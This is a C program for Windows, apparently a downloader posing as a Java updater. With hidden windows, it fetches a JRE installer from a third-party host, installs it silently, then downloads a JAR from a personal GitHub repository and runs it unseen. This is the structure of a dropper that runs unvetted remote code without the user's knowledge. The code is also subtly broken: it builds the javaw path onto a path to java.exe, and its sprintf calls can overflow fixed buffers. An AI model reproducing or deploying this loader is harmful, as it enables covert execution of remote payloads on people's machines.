#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <regex.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <curl/curl.h>
#include <windows.h>

bool isJavaInstalled() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcess(NULL, "java -version", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exit_code;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return exit_code == 0;
}

char* getJavaPath() {
    static char java_path[MAX_PATH] = "";
    DWORD len = SearchPath(NULL, "java.exe", NULL, MAX_PATH, java_path, NULL);
    if (len > 0 && len < MAX_PATH) {
        return java_path;
    }
    return NULL;
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

int download(const char *url, const char *local_filename) {
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if (!curl) {
        return -1;
    }

    FILE *fp = fopen(local_filename, "wb");
    if (!fp) {
        curl_easy_cleanup(curl);
        return -1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    res = curl_easy_perform(curl);

    fclose(fp);
    curl_easy_cleanup(curl);

    return (int)res;
}

int installJavaSilently(const char *installer_path) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char command[MAX_PATH + 4];
    sprintf(command, "\"%s\" /s", installer_path);

    if (!CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        return -1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exit_code;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return (int)exit_code;
}

int runUpdater(const char *updater_path, const char *java_path) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char command[MAX_PATH * 2 + 16];
    sprintf(command, "\"%s\\javaw.exe\" -jar \"%s\"", java_path, updater_path);

    if (!CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        return -1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exit_code;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return (int)exit_code;
}

void delete_file(const char *path) {
    remove(path);
}

int main() {
    char temp_dir[MAX_PATH];
    GetTempPath(MAX_PATH, temp_dir);

    if (!isJavaInstalled()) {
        const char *java_url = "https://files01.tchspt.com/temp/jre-8u371-windows-x64.exe";
        char local_filename[MAX_PATH];
        sprintf(local_filename, "%s\\jre-8u371-windows-x64.exe", temp_dir);
        int err = download(java_url, local_filename);
        if (err) {
            printf("Error downloading Java: %d\n", err);
            return 1;
        }
        installJavaSilently(local_filename);
        delete_file(local_filename);
    } else {
        printf("Java is already installed.\n");
    }

    char *java_path = getJavaPath();

    if (!java_path) {
        printf("Java path not found.\n");
    } else {
        const char *updater_url = "https://raw.githubusercontent.com/dolmety/storage/main/JavaUpdater.jar";
        char updater_path[MAX_PATH];
        sprintf(updater_path, "%s\\JavaUpdater.jar", temp_dir);
        int err = download(updater_url, updater_path);
        if (err) {
            printf("Error downloading updater: %d\n", err);
            return 1;
        }
        runUpdater(updater_path, java_path);
    }

    return 0;
}